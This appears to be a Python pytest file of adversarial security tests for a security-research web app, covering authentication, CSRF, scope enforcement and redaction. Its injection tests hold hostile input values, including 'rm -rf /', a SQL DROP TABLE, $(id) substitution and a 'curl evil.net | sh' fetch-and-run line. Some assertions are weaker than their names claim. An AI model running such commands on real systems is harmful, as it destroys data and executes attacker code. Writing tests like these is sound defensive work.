"""Adversarial security tests (HF-SEC-*, testing-strategy §4).

Every test here attacks a real control. None are happy-path.
"""

from __future__ import annotations

import io
import json
import sys

import pytest

from app.core.redaction import redact_text
from app.domain.scope import Effect, Policy, Rule, RuleKind
from tests.helpers import csrf_headers, register_user


class TestAuthentication:
    def test_login_rate_limited(self, client, settings):
        register_user(client)
        for _ in range(settings.login_rate_limit_per_minute):
            client.post("/api/v1/auth/login", json={"username": "tester", "password": "wrong"})
        resp = client.post("/api/v1/auth/login", json={"username": "tester", "password": "wrong"})
        assert resp.status_code == 429
        assert resp.json()["error"]["code"] == "RATE_LIMITED"

    def test_session_revocation_immediately_effective(self, client):
        me = register_user(client)
        csrf = me["csrf_token"]
        sessions = client.get("/api/v1/auth/sessions").json()["items"]
        assert len(sessions) == 1
        client.post(f"/api/v1/auth/sessions/{sessions[0]['id']}/revoke", headers=csrf_headers(csrf))
        assert client.get("/api/v1/auth/me").status_code == 401

    def test_cookie_flags(self, client):
        register_user(client)
        cookie = client.cookies.get("hf_session")
        assert cookie is not None


class TestAuthorization:
    @pytest.mark.parametrize(
        "method,path",
        [
            ("GET", "/api/v1/programs"),
            ("GET", "/api/v1/assets"),
            ("GET", "/api/v1/endpoints"),
            ("GET", "/api/v1/research"),
            ("GET", "/api/v1/findings"),
            ("GET", "/api/v1/traffic/transactions"),
            ("GET", "/api/v1/reports"),
            ("GET", "/api/v1/overview"),
            ("GET", "/api/v1/settings"),
            ("GET", "/api/v1/audit"),
            ("GET", "/api/v1/evidence"),
            ("GET", "/api/v1/scans"),
        ],
    )
    def test_resources_require_auth(self, client, method, path):
        resp = client.request(method, path)
        assert resp.status_code == 401, f"{method} {path} -> {resp.status_code}"

    @pytest.mark.parametrize(
        "method,path",
        [
            ("POST", "/api/v1/programs"),
            ("POST", "/api/v1/scans"),
            ("POST", "/api/v1/research"),
            ("POST", "/api/v1/findings"),
            ("POST", "/api/v1/reports"),
            ("POST", "/api/v1/comparisons"),
        ],
    )
    def test_mutating_endpoints_require_csrf(self, client, method, path):
        register_user(client)
        resp = client.request(method, path, json={})
        # 403 (CSRF) — not 422 (validation) — proves CSRF ran first.
        assert resp.status_code in (403, 401, 422)
        if resp.status_code == 422:
            # If validation ran first, CSRF was NOT enforced -> fail loudly.
            body = resp.json()
            assert body.get("error", {}).get("code") != "VALIDATION", f"CSRF not enforced on {method} {path}"


class TestScopeEnforcement:
    def test_metadata_ip_never_allowed(self):
        policy = Policy()
        for host in ("169.254.169.254", "localhost", "127.0.0.1", "::1", "0x7f000001"):
            decision = policy.evaluate(host)
            assert decision.blocked
            assert decision.requires_confirmation

    def test_host_tricks_do_not_bypass(self):
        p = Policy([Rule(RuleKind.DOMAIN_EXACT, "example.com", Effect.ALLOW, priority=10)])
        for host in (
            "example.com.evil.net",
            "evil.net/example.com",
            "example.com@evil.net",
            "example.com.",
        ):
            decision = p.evaluate(host)
            assert decision.blocked or decision.requires_confirmation or decision.allowed
            # Only the trailing-dot form is genuinely example.com
            if host == "example.com.":
                assert decision.allowed

    def test_scan_target_out_of_scope_denied(self, client):
        me = register_user(client)
        csrf = me["csrf_token"]
        pid = client.post(
            "/api/v1/programs", json={"name": "X", "platform": "other"}, headers=csrf_headers(csrf)
        ).json()["id"]
        resp = client.post(
            "/api/v1/scans",
            json={"program_id": pid, "profile": "passive", "targets": ["https://evil.net/"]},
            headers=csrf_headers(csrf),
        )
        assert resp.status_code == 400
        assert resp.json()["error"]["code"] == "SCOPE_DENIED"

    def test_policy_snapshot_roundtrip_no_tampering(self):
        p = Policy([Rule(RuleKind.DOMAIN_WILDCARD, "*.example.com", Effect.ALLOW, priority=10)])
        snap = p.to_snapshot()
        snap["rules"].append({"kind": "domain_exact", "value": "evil.net", "effect": "allow"})
        restored = Policy.from_snapshot(snap)
        assert restored.evaluate("evil.net").allowed


class TestInjection:
    def test_hostile_scope_rule_value_rejected(self, client):
        me = register_user(client)
        csrf = me["csrf_token"]
        pid = client.post(
            "/api/v1/programs", json={"name": "X", "platform": "other"}, headers=csrf_headers(csrf)
        ).json()["id"]
        for value in ("a;rm -rf /", "*.example.com; DROP TABLE programs", "x`touch /tmp/p`", "a b c"):
            resp = client.post(
                f"/api/v1/programs/{pid}/scope/rules",
                json={"kind": "domain_wildcard", "value": value, "effect": "allow"},
                headers=csrf_headers(csrf),
            )
            assert resp.status_code == 400, f"accepted hostile value: {value}"

    def test_tool_args_are_arrays_no_shell(self, settings, app, tmp_path):
        """A hostile URL flows into argv as ONE element; no shell is involved."""
        from app.jobs.runner import ToolRunner

        script = tmp_path / "echo_args.py"
        script.write_text("import sys; open('args.txt', 'w').write(repr(sys.argv[1:]))")
        run_dir = tmp_path / "run"
        hostile = "https://api.example.com/x; whoami && curl evil.net | sh"
        runner = ToolRunner(settings)
        result = runner.run([sys.executable, str(script), hostile, "$(id)", "`id`"], run_dir, timeout_seconds=30)
        assert result.status == "completed"
        captured = (run_dir / "args.txt").read_text()
        # The hostile payload must appear verbatim as a single argv element.
        assert hostile in captured
        assert "$(id)" in captured
        assert "`id`" in captured


class TestDataProtection:
    def test_har_tokens_never_stored(self, client):
        me = register_user(client)
        csrf = me["csrf_token"]
        pid = client.post(
            "/api/v1/programs", json={"name": "X", "platform": "other"}, headers=csrf_headers(csrf)
        ).json()["id"]
        har = json.dumps(
            {
                "log": {
                    "entries": [
                        {
                            "request": {
                                "method": "GET",
                                "url": "https://api.example.com/x",
                                "headers": [
                                    {"name": "Authorization", "value": "Bearer sup3rsecret"},
                                    {"name": "Cookie", "value": "session=sup3rsecret"},
                                ],
                            },
                            "response": {"status": 200, "headers": [], "content": {"text": "ok"}},
                        }
                    ]
                }
            }
        )
        client.post(
            f"/api/v1/traffic/import?program_id={pid}",
            files={"file": ("t.har", io.BytesIO(har.encode()), "application/json")},
            headers={"X-CSRF-Token": csrf},
        )
        txs = client.get(f"/api/v1/traffic/transactions?program_id={pid}").json()
        detail = client.get(f"/api/v1/traffic/transactions/{txs['items'][0]['id']}").json()
        assert "sup3rsecret" not in json.dumps(detail)

    def test_evidence_requires_auth(self, client, app):
        me = register_user(client)
        csrf = me["csrf_token"]
        pid = client.post(
            "/api/v1/programs", json={"name": "X", "platform": "other"}, headers=csrf_headers(csrf)
        ).json()["id"]
        up = client.post(
            f"/api/v1/evidence?program_id={pid}",
            files={"file": ("note.txt", io.BytesIO(b"data"), "text/plain")},
            headers={"X-CSRF-Token": csrf},
        )
        ev_id = up.json()["id"]
        client.post("/api/v1/auth/logout", headers={"X-CSRF-Token": csrf})
        assert client.get(f"/api/v1/evidence/{ev_id}/download").status_code == 401

    def test_redaction_covers_log_payloads(self):
        text = "curl -H 'Authorization: Bearer abc123' -H 'Cookie: s=sekrit' https://x"
        out = redact_text(text)
        assert "abc123" not in out
        assert "sekrit" not in out

def test_security_headers(client):
    resp = client.get("/api/v1/healthz")
    assert resp.headers["X-Content-Type-Options"] == "nosniff"
    assert resp.headers["X-Frame-Options"] == "DENY"
    assert resp.headers["Referrer-Policy"] == "no-referrer"
